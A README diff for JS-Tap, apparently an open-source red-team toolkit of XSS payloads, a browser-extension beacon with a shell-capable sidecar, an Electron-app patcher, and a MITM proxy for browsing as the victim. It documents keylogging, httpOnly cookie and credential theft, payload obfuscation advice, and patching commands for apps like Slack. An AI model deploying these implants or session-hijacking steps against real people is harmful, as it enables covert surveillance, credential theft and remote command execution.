@@ -29,13 +29,13 @@ I do not plan on creating migration scripts for the database, and version number
 
 
 ## Introduction
-JS-Tap is a generic JavaScript payload and supporting software to help red teamers attack webapps. The JS-Tap payload can be used as an XSS payload or as a post exploitation implant.
+JS-Tap is a JavaScript-based offensive toolkit for red teamers. It started as a generic JavaScript payload for attacking webapps via XSS or post-exploitation implant, and has grown to include browser extensions and Electron desktop app implants — all reporting to a single C2 server.
 
 The payload does not require the targeted user running the payload to be authenticated to the application being attacked, and it does not require any prior knowledge of the application beyond finding a way to get the JavaScript into the application.
 
 Instead of attacking the application server itself, the JS-Tap payload focuses on the client-side of the application and heavily instruments the client-side code. A C2 system allows custom JavaScript payloads to be added and run as tasks on JS-Tap clients, providing a means to attack the application server directly. To facilitate faster transition to attacking the server, JS-Tap now includes a "mimic" feature to automatically generate custom payloads and hand them off to the C2 system.
 
-The example JS-Tap payload is contained in the **telemlib.js** file in the payloads directory, however any file in this directory is served unauthenticated so you can serve multiple payloads with different configurations targeting different applications at the same time. <br>
+The example DOM Beacon payload is contained in the **telemlib.js** file in the payloads directory, however any file in this directory is served unauthenticated so you can serve multiple payloads with different configurations targeting different applications at the same time. <br>
 
 Copy the **telemlib.js** file to whatever filename you wish and modify the configuration as needed. This file has _not_ been obfuscated. Prior to using in an engagement strongly consider changing the naming of endpoints, stripping comments, and highly obfuscating the payload. By default the application uses rather obvious API endpoints (e.g. /loot/screenshot), in **App Settings** you can turn on traffic obfuscation.
 
@@ -43,30 +43,40 @@ Make sure you review the configuration section below carefully before using on a
 
 ## Architecture Overview
 
-JS-Tap has three client types that connect to the same server:
+JS-Tap has four beacon/agent types that connect to the same server:
 
-| Client Type | What It Is | How It Gets There |
+| Beacon Type | What It Is | How It Gets There |
 |---|---|---|
-| **JS-Tap Implant** (telemlib.js) | A JavaScript payload injected into a web page. Instruments the DOM, captures user activity, screenshots, network calls. | XSS vulnerability, or directly added to the target app's JavaScript files (post-exploitation). |
-| **BEX Beacon** | A browser extension (Chrome MV3 / Firefox MV2). Monitors all browsing activity, captures cookies (including httpOnly), localStorage, sessionStorage, and request headers. Can inject JS-Tap implants into specific domains on command. | Installed in the target's browser (social engineering, physical access, policy push, etc.). |
+| **DOM Beacon** (telemlib.js) | A JavaScript payload injected into a web page. Instruments the DOM, captures user activity, screenshots, network calls. | XSS vulnerability, or directly added to the target app's JavaScript files (post-exploitation). |
+| **BEX Beacon** | A browser extension (Chrome MV3 / Firefox MV2). Monitors all browsing activity, captures cookies (including httpOnly), localStorage, sessionStorage, and request headers. Can inject DOM Beacons into specific domains on command. | Installed in the target's browser (social engineering, physical access, policy push, etc.). |
 | **Sidecar** | A native Go binary that runs on the target's OS. Provides file system browsing, file reading, and command execution. | Installed alongside the BEX Beacon via native messaging. Requires the BEX Beacon to relay commands. |
+| **Atom Beacon** | A dual-layer implant for Electron desktop applications. Injects a main-process agent (Node.js runtime) + renderer payloads into all app windows. Combines browser-level data collection with host-level OS access — no separate binary needed. | Patched into the target Electron app's ASAR archive (or unpacked app directory) using `atomize.py`. |
 
-All three report back to the same JS-Tap server portal, where loot is viewed and C2 commands are issued.
+All four report back to the same JS-Tap server portal, where loot is viewed and C2 commands are issued.
 
-A companion tool, **BEX Conductor**, runs on the operator's Firefox. It imports session data captured by the BEX Beacon (as a "BEX Ticket") and replays it — setting cookies, injecting headers, populating storage, and spoofing the User-Agent — so the operator can browse as the victim. See [BEX Tickets & BEX Conductor](#bex-tickets--bex-conductor-session-cloning) below.
+The portal also includes two session-cloning tools:
+
+| Tool | What It Does |
+|---|---|
+| **Browser Proxy** | A MITM proxy on the JS-Tap server that routes the operator's HTTP/HTTPS traffic through the victim's browser via WebSocket. Requests are fetched from the victim's browser/IP, so the target site sees the victim's cookies, IP, and TLS fingerprint. Per-domain credential spoofing can be toggled to inject the victim's cookies and auth headers. See [Browser Proxy](#browser-proxy) below. |
+| **BEX Conductor** | A standalone Firefox extension that imports session data captured by the BEX Beacon (as a "BEX Ticket") and replays it locally — setting cookies, injecting headers, populating storage, and spoofing the User-Agent — so the operator can browse as the victim. See [BEX Tickets & BEX Conductor](#bex-tickets--bex-conductor-session-cloning) below. |
 
 ### How They Work Together
 
-1. **Standalone implant:** The JS-Tap payload (telemlib.js) works independently. Inject it via XSS or implant it in the target's JS files. It calls home to the JS-Tap server on its own.
+1. **Standalone DOM Beacon:** The DOM Beacon payload (telemlib.js) works independently. Inject it via XSS or implant it in the target's JS files. It calls home to the JS-Tap server on its own.
 
-2. **BEX Beacon as a dropper:** The BEX Beacon monitors browsing and collects passive intelligence (cookies, localStorage, sessionStorage, request headers, navigation). From the JS-Tap portal, you can command the beacon to inject a full JS-Tap implant into a specific domain. The implant spawned by a beacon gets high-quality screenshots via the extension's `captureVisibleTab` API (the "BEX-Assist" mode).
+2. **BEX Beacon as a dropper:** The BEX Beacon monitors browsing and collects passive intelligence (cookies, localStorage, sessionStorage, request headers, navigation). From the JS-Tap portal, you can command the beacon to inject a DOM Beacon into a specific domain. The DOM Beacon spawned by a BEX Beacon gets high-quality screenshots via the extension's `captureVisibleTab` API (the "BEX-Assist" mode).
 
 3. **Sidecar for OS access:** When installed, the Sidecar binary gives the BEX Beacon access to the underlying operating system. Commands are sent from the JS-Tap portal, relayed through the beacon's encrypted channel to the native binary, and results are sent back. This turns a browser extension into a foothold for file system access and command execution.
+
+4. **Browser Proxy for live browsing:** The operator configures their browser to use the JS-Tap proxy and all HTTP/HTTPS traffic is routed through the victim's browser in real time. The proxy performs MITM TLS termination (with an auto-generated CA) so the operator can browse HTTPS sites. With per-domain credential spoofing enabled, the victim's cookies and auth headers are injected into requests, giving the operator an authenticated session from the victim's IP address.
+
+5. **Atom Beacon for Electron apps:** The `atomize.py` patcher modifies an Electron app's ASAR archive to inject the Atom Beacon agent. On launch, the agent registers with the JS-Tap server, begins encrypted C2 communication, and automatically injects renderer payloads into every BrowserWindow the app creates. The main process agent provides native OS access (file system, command execution) while the renderer payloads collect DOM-level data (keystrokes, inputs, forms, cookies, storage, network calls). Because it runs inside the Electron main process with full Node.js access, it doesn't need a separate sidecar binary — file browsing, file reading, and shell commands are built in.
 
 
 ## Data Collected
 
-### JS-Tap Implants
+### DOM Beacons
 * Client IP address, OS, Browser
 * Fingerprint of browser (optional config)
 * User inputs (credentials, etc.)
@@ -100,16 +110,38 @@ Note: ability to receive copies of XHR and Fetch API calls works in trap mode. I
 * Cookies for visited domains (including httpOnly via `browser.cookies.getAll()`, with metadata: httpOnly, secure, sameSite, path, domain, expiration)
 * localStorage and sessionStorage
 * Request headers (authorization, x-api-key, cookie, set-cookie) for monitored domains
-* Can inject JS-Tap implants on command (which then collect everything above)
+* Can inject DOM Beacons on command (which then collect everything above)
 
 ### Sidecar (via BEX Beacon)
 * Directory listings (file names, sizes, permissions, timestamps)
 * File contents (up to 1MB per read, with offset/limit support)
 * Command execution output (stdout, stderr, exit code)
 
+### Atom Beacon (Electron Apps)
+**Main process agent (Node.js runtime):**
+* All cookies from all domains via `session.cookies` API (including httpOnly, with metadata)
+* Request headers (Authorization, x-api-key, Cookie, Set-Cookie) via `webRequest.onBeforeSendHeaders`
+* Response headers (Set-Cookie, WWW-Authenticate, x-csrf-token, Location) via `webRequest.onHeadersReceived`
+* Screenshots of application windows via Electron's `desktopCapturer` API (captures GPU-composited output)
+* Host information (hostname, platform, architecture, username, home directory)
+* Tracked window list (URLs, titles, injection status)
+* File system access (directory listings, file reading) — native, no sidecar needed
+* Command execution (shell commands with stdout/stderr/exit code) — native, no sidecar needed
+
+**Renderer payloads (injected into all app windows):**
+* Keystroke capture (keylogging with target element context, buffered and debounced)
+* User inputs (from input fields and textareas via change events)
+* Form submissions (action, method, all form data)
+* Cookies (from `document.cookie`, change-tracked)
+* localStorage and sessionStorage (change-tracked)
+* URLs visited (including SPA navigation via pushState/replaceState/hashchange)
+* HTML source of pages
+* XHR API calls (method, URL, headers, request body, response body, status)
+* Fetch API calls (method, URL, headers, request body, response body, status)
+
 
 ## Operating Modes
-The JS-Tap payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
+The DOM Beacon payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
 #### Trap Mode
 Trap mode is typically the mode you would use as a XSS payload. Execution of XSS payloads is often fleeting, the user viewing the page where the malicious JavaScript payload runs may close the browser tab (the page isn't interesting) or navigate elsewhere in the application. In both cases, the payload will be deleted from memory and stop working. JS-Tap needs to run a long time or you won't collect useful data.
 
@@ -133,7 +165,7 @@ Implant mode is more likely to work with applications as it doesn't involve all 
 #### BEX Beacon (Browser Extension)
 The **BEX Beacon** is a browser extension version of JS-Tap. It serves two primary purposes:
 1. **Passive Intelligence:** It monitors all browsing activity across all domains (configurable via whitelist), capturing cookies (including httpOnly with full metadata), localStorage, sessionStorage, request headers, and navigation events without requiring an XSS vulnerability.
-2. **Active Dropper:** It can be tasked via the JS-Tap portal to inject a full JS-Tap implant into specific domains. This allows you to turn a simple browser extension into a delivery vehicle for full post-exploitation implants.
+2. **Active Dropper:** It can be tasked via the JS-Tap portal to inject a DOM Beacon into specific domains. This allows you to turn a simple browser extension into a delivery vehicle for full post-exploitation implants.
 
 The BEX Beacon uses app-layer encrypted communication (AES-GCM) with the JS-Tap server. All telemetry and task responses are encrypted end-to-end through a single endpoint, making network traffic harder to fingerprint.
 
@@ -141,14 +173,33 @@ The beacon also includes features like CSP/X-Frame-Options header stripping (via
 
 When paired with the optional **Sidecar** native messaging host, the BEX Beacon gains OS-level access on the target machine. See the [Sidecar](#sidecar-native-messaging) section below.
 
+#### Atom Beacon (Electron App Implant)
+The **Atom Beacon** is an implant for Electron desktop applications. It operates as a **dual-layer agent** — a privileged main process agent with full Node.js runtime access, plus renderer payloads automatically injected into every BrowserWindow the app creates.
+
+Unlike the BEX Beacon + Sidecar combination, the Atom Beacon doesn't need a separate native binary for OS access — file system operations, command execution, and screenshot capture are all built into the main process agent using Node.js APIs.
+
+The Atom Beacon uses the same encrypted communication protocol as the BEX Beacon (AES-GCM encryption over a single endpoint, with RSA-OAEP key exchange). It registers as a distinct client type (`atom-beacon`) and appears in the **Apps** view alongside DOM Beacons.
+
+**Key capabilities:**
+- **Renderer injection** — Automatically injects data collection payloads into all BrowserWindows via `webContents.executeJavaScript()`, including windows created after initial launch. Renderer payloads capture keystrokes, inputs, forms, cookies, storage, URLs, HTML, and XHR/Fetch network calls.
+- **Screenshots** — Captures window screenshots using Electron's `desktopCapturer` API, which produces pixel-perfect captures including GPU-composited content. Supports manual capture (via the portal UI), heuristic auto-capture (on window focus, navigation, and new windows), and configurable cooldown periods.
+- **Native OS access** — File browsing, file reading, and shell command execution are built into the agent. They use the same portal UI as the BEX Sidecar (file browser and shell tabs in the Tools panel).
+- **HTTP interception** — Captures request headers via `webRequest.onBeforeSendHeaders` and response headers via `webRequest.onHeadersReceived` at the Electron session level.
+- **Cookie capture** — Reads all cookies (including httpOnly) from the Electron session via `session.cookies.get()`.
+
+See [Atom Beacon (Patching Electron Apps)](#atom-beacon-patching-electron-apps) below for setup and usage.
+
 ## Screenshotting Systems
-JS-Tap employs two distinct methods for capturing screenshots:
+JS-Tap employs three distinct methods for capturing screenshots:
 
 ### 1. html2canvas (Standard)
-Used by default in all implants. It attempts to reconstruct the page as a canvas element and export it as an image. This works well for most sites but can struggle with complex modern apps (like Reddit) or cross-origin images.
+Used by default in DOM Beacon implants. It attempts to reconstruct the page as a canvas element and export it as an image. This works well for most sites but can struggle with complex modern apps (like Reddit) or cross-origin images.
 
 ### 2. Hybrid BEX-Assist (High Quality)
-When an implant is spawned by a **BEX Beacon**, it gains access to the extension's high-level browser APIs. In this mode, the implant asks the beacon to take the screenshot using `chrome.tabs.captureVisibleTab`. This results in a pixel-perfect, high-quality capture that bypasses all CSS/DOM limitations of `html2canvas`. This is the recommended mode for complex targets.
+When a DOM Beacon implant is spawned by a **BEX Beacon**, it gains access to the extension's high-level browser APIs. In this mode, the implant asks the beacon to take the screenshot using `chrome.tabs.captureVisibleTab`. This results in a pixel-perfect, high-quality capture that bypasses all CSS/DOM limitations of `html2canvas`. This is the recommended mode for complex targets.
+
+### 3. Electron desktopCapturer (Atom Beacon)
+The Atom Beacon uses Electron's `desktopCapturer` API to capture window screenshots. This captures the actual GPU-composited window output, producing pixel-perfect screenshots of complex Electron apps (Slack, VS Code, Discord, etc.). Screenshots can be triggered manually from the portal, or automatically via configurable heuristics (window focus changes, navigation events, new window creation).
 
 
 ## Installation and Start
@@ -391,6 +442,123 @@ The communication between the beacon and the sidecar binary uses the [native mes
 | `exec_cmd` | `{ command: "whoami", timeout: 30 }` | Execute a shell command. Uses `/bin/sh -c` on Linux/macOS, `cmd.exe /C` on Windows. Max timeout is 120 seconds. Returns stdout, stderr, and exit code. |
 
 
+### Atom Beacon (Patching Electron Apps)
+
+The Atom Beacon implant is injected into Electron desktop applications using the `atomize.py` patcher. It modifies the app's ASAR archive (or unpacked app directory) to prepend the agent code to the main process entry point.
+
+#### Prerequisites
+
+- **Python 3** with no additional pip dependencies (uses a bundled pure-Python ASAR library)
+- **Target Electron app** — the app's `resources/app.asar` or `resources/app/` directory
+
+#### Analyzing a Target
+
+Before patching, use `--detect-only` to analyze the target app's structure, security settings, and code signing status:
+
+```bash
+cd atom-beacon
+python3 atomize.py --detect-only /Applications/Slack.app
+```
+
+This reports:
+- Entry point file (from `package.json`)
+- Whether the source is minified or readable
+- Electron security settings (nodeIntegration, contextIsolation, sandbox, etc.)
+- Code signing status (macOS)
+- ASAR integrity validation (macOS)
+- Whether the app has already been patched
+
+#### Patching
+
+```bash
+cd atom-beacon
+python3 atomize.py --server https://10.0.0.1:8444 /Applications/Slack.app
+```
+
+Options:
+
+| Flag | Description |
+|---|---|
+| `--server URL` | JS-Tap server URL (required for patching) |
+| `--tag TAG` | Client tag, shown in the portal (default: `atom`) |
+| `--detect-only` | Analyze without patching |
+| `--no-backup` | Skip creating a `.bak` backup of the original ASAR |
+| `--output PATH` | Write patched ASAR to a different path instead of in-place |
+
+The patcher automatically:
+- Locates `app.asar` or `app/` inside `.app` bundles (macOS), `resources/` directories (Linux/Windows), or accepts direct paths
+- Creates a `.bak` backup before modifying (unless `--no-backup`)
+- Detects and strips existing patches before re-patching
+- Generates a unique IPC prefix per patch to avoid collisions
+- Embeds the renderer payload as a string constant inside the agent (single-file injection)
+
+#### Post-Patch Notes
+
+| Platform | Notes |
+|---|---|
+| **macOS** | Code signature is invalidated. If the app shows a "damaged" warning, run `xattr -cr /path/to/App.app` or re-sign with `codesign --force --deep --sign - /path/to/App.app`. |
+| **Windows** | SmartScreen may warn on initial download, but already-installed apps are not re-verified. In-place patching works without issues. |
+| **Linux** | No code signing enforcement. The patched app runs normally. |
+
+#### Unpacking (Reverting)
+
+To revert a patched app, restore the `.bak` file:
+
+```bash
+cp /path/to/resources/app.asar.bak /path/to/resources/app.asar
+```
+
+#### How the Atom Beacon Works
+
+```
+Target Electron App (patched)
+    │ app.asar main entry point
+    ▼
+Atom Beacon Agent (main process, Node.js)
+    │ Registers with JS-Tap server
+    │ RSA-OAEP key exchange → AES-GCM encrypted channel
+    ▼
+Heartbeat Loop (jittered interval)
+    ├── Poll for tasks (screenshot commands, shell commands, etc.)
+    ├── Flush renderer data (keystrokes, inputs, cookies, storage, network calls)
+    ├── Exfiltrate queued data (encrypted, single endpoint)
+    └── Report status (tracked windows, host info)
+
+Renderer Injection (automatic)
+    │ webContents.executeJavaScript() on every BrowserWindow
+    ▼
+Renderer Payload (per-window)
+    ├── Keylogger (keydown capture, debounced flush)
+    ├── Input/Form capture
+    ├── Cookie/localStorage/sessionStorage monitoring
+    ├── URL tracking (including SPA navigation)
+    ├── XHR/Fetch monkey-patching
+    └── HTML source capture
+```
+
+The agent communicates with the server through the same encrypted endpoint used by BEX Beacons (`POST /client/metrics/<uuid>`). All data is AES-GCM encrypted with keys established during registration.
+
+#### Using the Tools Panel (Atom Beacon)
+
+When an Atom Beacon client is selected in the portal, the **Tools** panel provides:
+
+**File Browser tab** — Browse the target's file system and read files, identical to the BEX Sidecar file browser but running natively in the Electron process.
+
+**Shell tab** — Execute commands on the target, identical to the BEX Sidecar shell but running natively via Node.js `child_process`.
+
+**Screenshots tab** — Atom Beacon only. Provides:
+- **Capture Now** button for manual on-demand screenshots
+- **Auto-capture heuristics** — configurable toggles for automatic screenshot triggers:
+  - *Capture on window focus* — screenshots when the user switches between app windows
+  - *Capture on navigation* — screenshots on page navigation (including SPA navigation like channel switching in Slack)
+  - *Capture on new window* — screenshots when the app opens a new window
+- **Cooldown** — minimum seconds between automatic captures per window (prevents flooding)
+
+Auto-capture uses debounced triggers — for SPA navigation, the screenshot is taken 3 seconds after the last navigation/title-change event, ensuring the arrived-at content is captured rather than the departing page.
+
+The Tools panel badge shows **Built-in** for Atom Beacon clients (since OS access is native to the agent, not dependent on an external sidecar binary).
+
+
 ## Configuration
 
 ### JS-Tap Server Configuration
@@ -619,12 +787,18 @@ Login with the admin credentials provided by the server script on startup (also 
 ### Client Management
 Clients show up on the left, grouped by type (**Apps** vs **Browsers**). Use the toggle buttons at the top of the client list to switch between views.
 
-* **Apps** — JS-Tap implant clients (from telemlib.js payloads)
+* **Apps** — DOM Beacon clients (from telemlib.js payloads) and Atom Beacon clients (from patched Electron apps)
 * **Browsers** — BEX Beacon clients
 
 Selecting a client will show a time series of their events (loot) on the right. If you filter the list (e.g. switching from Apps to Browsers), the currently selected loot view will dim and turn grayscale to indicate it is "background" data.
 
-**Beacons (Browsers)** can be expanded to see all domains they have visited. You can trigger JS-Tap injection from the domain list. Beacon cards in the sidebar will display a summary of any implants they have successfully spawned.
+When in the **Browsers** view, the detail column header shows a **Loot / Tools** toggle:
+* **Loot** tab — Domain cards showing visited domains, injection controls, and per-domain credential spoofing toggles.
+* **Tools** tab — Browser Proxy panel (always visible) and Sidecar panel (collapsible, if the beacon supports it).
+
+Atom Beacon clients (in the **Apps** view) also have a **Loot / Tools** toggle. Their Tools panel provides built-in file browsing, shell access, and screenshot controls without requiring a separate sidecar binary.
+
+**BEX Beacons (Browsers)** can be expanded to see all domains they have visited. You can trigger DOM Beacon injection from the domain list. BEX Beacon cards in the sidebar will display a summary of any DOM Beacons they have successfully spawned.
 
 The clients list can be sorted by time (first seen, last update received) and the list can be filtered to only show the "starred" clients. There is also a quick filter search above the clients list that allows you to quickly filter clients that have the entered string. Useful if you set an optional tag in the payload configuration. Optional tags show up prepended to the client nickname. Filtering is checked against the optional tag, nickname, IP address, fingerprint, browser, platform, client type, domain, and UUID. Note you can reverse the filter search by prepending your search term with a '!'. For example, to show all clients not using Firefox use the filter term "!firefox". You can combine multiple terms with `&&` for AND logic (e.g. `linux && chrome && !bex`).
 
@@ -640,12 +814,12 @@ If you want to better hide the JS-Tap network traffic from inspection, in **App 
 
 Each client has a "notes" feature. If you find juicy information for that particular client (credentials, API tokens, etc) you can add it to the client notes. After you've reviewed all your clients and made your notes, the **View All Notes** feature at the top allows you to export all notes from all clients at once.
 
-The events list can be filtered by event type if you're trying to focus on something specific, like screenshots. Note that the events/loot list does _not_ automatically update (the clients list does). If you want to load the latest events for the client you need to select the client again on the left.
+The events list can be filtered by event type if you're trying to focus on something specific, like screenshots. For DOM Beacon clients, the events/loot list does _not_ automatically update (the clients list does) — if you want to load the latest events you need to select the client again on the left. Atom Beacon and BEX Beacon clients use an auto-refreshing event view that incrementally appends new events without resetting your scroll position.
 
 ### BEX Injection
-When viewing a Beacon's domain intelligence, you can click **Inject JS-Tap** to queue an injection.
+When viewing a Beacon's domain intelligence, you can click **Inject DOM Beacon** to queue an injection.
 * A "SUCCESS" badge will appear once the injection script is requested.
-* The nickname of the spawned implant will be automatically linked and displayed on the domain card and the beacon's sidebar card.
+* The nickname of the spawned DOM Beacon will be automatically linked and displayed on the domain card and the beacon's sidebar card.
 * Injections happen immediately if the user is currently on the target domain, or upon the next visit.
 
 ### BEX Tickets & BEX Conductor (Session Cloning)
@@ -701,9 +875,37 @@ The popup shows all active tickets with badge counts for cookies, headers, local
 - **Storage:** Open DevTools → Storage → Local Storage / Session Storage. Verify the imported keys are present.
 - **Navigator spoofing:** Open the browser console and type `navigator.userAgent` — it should return the victim's UA string, not Firefox's.
 
-### Using the Sidecar Panel
+### Browser Proxy
 
-When a BEX Beacon client has the Sidecar connected, the client detail view will show a **Sidecar** panel above the domain list. The panel has two tabs:
+The Browser Proxy lets you route your browser traffic through the victim's browser in real time. Unlike BEX Tickets (which clone a snapshot of session data), the proxy provides a live channel — requests are fetched from the victim's browser and IP address, so the target site sees the victim's cookies, IP, and TLS fingerprint.
+
+#### How It Works
+
+1. Select a BEX Beacon in the portal and switch to the **Tools** tab.
+2. Click **Start Proxy** on the Browser Proxy panel. The server allocates a local port (shown in the panel).
+3. Configure your browser to use `127.0.0.1:<port>` as an HTTP/HTTPS proxy.
+4. Download the **CA Cert** and install it in your browser's certificate store (needed for HTTPS MITM).
+5. Browse normally — all requests are forwarded through the beacon's WebSocket connection and executed by the victim's browser via `fetch()`.
+
+The proxy performs TLS termination using dynamically generated per-domain certificates signed by the JS-Tap CA. This allows it to inspect and relay HTTPS traffic transparently.
+
+#### Credential Spoofing
+
+By default, proxied requests do **not** carry the victim's credentials — the target site will see an unauthenticated request and prompt you to log in. To inject the victim's session:
+
+1. In the **Loot** tab, find the domain card for the target site.
+2. Toggle the **Proxy Credential Spoofing** switch on that domain card (only available when the proxy is active).
+3. When enabled, the beacon injects the victim's cookies (including httpOnly, read from the browser's cookie jar), captured Authorization headers, and User-Agent into outgoing requests for that domain.
+
+This gives you fine-grained control over which domains use the victim's credentials.
+
+#### Proxy Tickets
+
+While the proxy is active, you can click **Proxy Ticket** to generate a BEX Conductor-compatible ticket. This is useful if you want to switch from live proxying to local session replay.
+
+### Using the Sidecar / Tools Panel
+
+When a BEX Beacon client has the Sidecar connected, the **Tools** tab will show a **Sidecar** panel (collapsed by default, below the Browser Proxy panel). Atom Beacon clients show the same panel as **Tools** with a **Built-in** badge (since OS access is native to the agent). The panel has tabs:
 
 #### File Browser Tab
 - The file browser automatically lists the user's home directory when the panel first loads
@@ -723,7 +925,13 @@ When a BEX Beacon client has the Sidecar connected, the client detail view will 
 - Output is color-coded: green for prompts, white for stdout, red for stderr
 - CWD tracking uses POSIX shell syntax and works on Linux/macOS targets
 
-**Note:** Sidecar commands are asynchronous. When you send a command, the UI polls for results. The beacon must check in (heartbeat) to pick up the command, forward it to the native binary, and send the result back. With default heartbeat settings, expect a few seconds delay.
+#### Screenshots Tab (Atom Beacon only)
+- **Capture Now** — Manually trigger a screenshot of all tracked windows
+- **Auto-capture toggles** — Enable/disable automatic screenshots on window focus, navigation, and new window events
+- **Cooldown** — Minimum seconds between auto-captures per window (default: 30, minimum: 5)
+- Click **Save Settings** to push toggle/cooldown changes to the agent in real time
+
+**Note:** Commands are asynchronous. When you send a command, the UI polls for results. The beacon/agent must check in (heartbeat) to pick up the command and send the result back. With default heartbeat settings, expect a few seconds delay.
 
 ### Custom Payloads
 Multiple JavaScript payloads can be added in the JS-Tap portal and executed on a single client, all current clients, or set to autorun on all future clients. Payloads can be written/edited within the JS-Tap portal, or imported from a file. Payloads can also be exported. The format for importing payloads is simple JSON. The JavaScript code and description are simply base64 encoded.
@@ -783,9 +991,12 @@ JS-Tap/
 ├── index.html              # Dashboard HTML
 ├── login.html              # Login page
 ├── payloads/
-│   └── telemlib.js         # JS-Tap implant payload
+│   └── telemlib.js         # DOM Beacon payload
 ├── protectedStatic/
 │   └── main.js             # All dashboard UI logic
+├── proxy/                  # Browser Proxy (MITM proxy server)
+│   ├── server.py           # Threaded proxy server, WebSocket relay, MITM TLS
+│   └── certs.py            # Dynamic per-domain certificate generation
 ├── bex-conductor/          # Session replay Firefox extension (standalone MV2)
 │   ├── manifest.json       # Firefox MV2 manifest
 │   ├── icon.svg            # Extension icon (JS-Tap logo)
@@ -803,9 +1014,16 @@ JS-Tap/
 │   ├── utils/
 │   │   ├── config.ts       # Config translation + whitelist helpers
 │   │   ├── crypto.ts       # AES-GCM encryption/decryption helpers
+│   │   ├── proxy.ts        # Browser Proxy WebSocket client + fetch relay
 │   │   └── sidecar.ts      # Native messaging module
 │   ├── src-chrome-extension/   # Legacy Chrome MV3 template
 │   └── src-firefox-extension/  # Legacy Firefox MV2 template
+├── atom-beacon/            # Electron app implant patcher
+│   ├── atomize.py          # Patcher CLI (analyze + patch Electron apps)
+│   ├── asar.py             # Pure-Python ASAR archive handling (extract/pack/patch)
+│   └── payload/
+│       ├── atom-agent.js   # Main process agent (C2, encryption, OS access, screenshots)
+│       └── atom-telemlib.js # Renderer payload (keylogging, DOM capture, network interception)
 ├── sidecar/                # Native messaging Go binary
 │   ├── main.go             # Message loop (native messaging protocol)
 │   ├── commands.go         # Command handlers (list_dir, read_file, exec_cmd)
@@ -866,7 +1084,7 @@ By default this will start the application running on:
 https://127.0.0.1:8443
 ```
 
-Pressing the "Inject JS-Tap payload" button will run the JS-Tap payload. This works for either implant or trap mode. You may need to point the monkeyPatchLab application at a new JS-Tap server location for loading the payload file, you can find this set in the **injectPayload()** function in **main.js**
+Pressing the "Inject JS-Tap payload" button will run the DOM Beacon payload. This works for either implant or trap mode. You may need to point the monkeyPatchLab application at a new JS-Tap server location for loading the payload file, you can find this set in the **injectPayload()** function in **main.js**
 
 ```
 function injectPayload()
